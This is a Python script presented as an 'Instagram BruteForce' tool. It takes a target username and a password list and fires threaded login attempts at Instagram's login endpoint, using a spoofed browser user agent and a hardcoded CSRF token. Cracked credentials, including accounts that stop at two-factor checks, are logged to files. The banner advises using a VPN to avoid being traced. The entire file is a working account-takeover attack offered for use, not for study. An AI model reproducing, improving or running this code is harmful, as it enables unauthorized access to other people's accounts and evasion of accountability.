from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input

CheckVersion = str (sys.version)
import re
from datetime import datetime
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    LOGO = '\033[1;34;40m'
    UNDERLINE = '\033[4m'

print (bcolors.LOGO +'''

$$$$$$$$$$$$$$$$     $$$$   $$$$   $$$$     $$$$$$$$$$$$$$$$$   $$$$$$$$$$$$$$$$$   $$$$  ##### #   #
 0$$$$$$$$$$4$$$     $$$$   $$$$   $$$$      0$$$$$$$$$$$$$0     0$$$$$$$$$$$$$0    $$$$    #   ## ##
         $$$$$       $$$$   $$$$   $$$$                                             $$$$    #   # # #  
       $$$$$         $$$$   $$$$   $$$$     $$$$$$$$$$$$$$$$$   $$$$$$$$$$$$$$$$$   $$$$
    $$$$$            $$$$   $$$$   $$$$      0$$$$$$$$$$$$$0     0$$$$$$$$$$$$$0    $$$$
  $$$$$              $$$$   $$$$   $$$$                                             $$$$
$$$$$$$$$$$$$0     0$$$$$$$$$$$$$$$$$$$$0   $$$$$$$$$$$$$$$$$   $$$$$$$$$$$$$$$$$   $$$$
$$$$$$$$$$$$$$$   $$$$$$$$$$0  0$$$$$$$$$$   0$$$$$$$$$$$$$0     0$$$$$$$$$$$$$0    $$$$
''' + bcolors.ENDC)
print (bcolors.OKGREEN +'''

------------------Instagram BruteForce------------------
            Only Available for Instagram.com
''' + bcolors.ENDC)
print (bcolors.WARNING +" use vpn first to use this tool, for your safety! " + bcolors.ENDC)
print (bcolors.OKGREEN +'''-------------------------LICENSE------------------------''' + bcolors.ENDC)
print ('''
Developer   : Syahs
Departement : Cyber Security
Corporate   : Zweei Corp 
Publisher   : www.github.com''')
print (bcolors.WARNING +'''                    
---------------------------Use--------------------------
Username    : "enter username instagram"
PassList    : pass.txt / custompass.txt 
''' + bcolors.ENDC)
print (bcolors.FAIL +'''
        """""""""""""""""""""""""""""""""""""""""" 
                     Let's Started
''' + bcolors.ENDC)


class InstaBrute (object):
    def __init__(self):

        try:
            user = input ('username : ')
            Combo = input ('passList : ')
            print ('\n----------------------------')

        except:
            print (' The tool was arrested exit ')
            sys.exit ()

        with open (Combo, 'r') as x:
            Combolist = x.read ().splitlines ()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split (':')[0]
            t = threading.Thread (target=self.New_Br, args=(user, password))
            t.start ()
            thread.append (t)
            time.sleep (0.9)
        for j in thread:
            j.join ()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system ([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int (datetime.now ().timestamp ())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session () as s:
            r = s.get (link)
            r = s.post (login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })
            print (f'{user}:{pwd}\n----------------------------')


            if 'checkpoint_url' in r.text:
                print (('' + user + ':' + pwd + ' --> I GET IT! '))
                with open ('good.txt', 'a') as x:
                    x.write (user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                print (('' + user + ':' + pwd + ' -->  Good It has to be checked '))
                with open ('results_NeedVerfiy.txt', 'a') as x:
                    x.write (user + ':' + pwd + '\n')


InstaBrute()
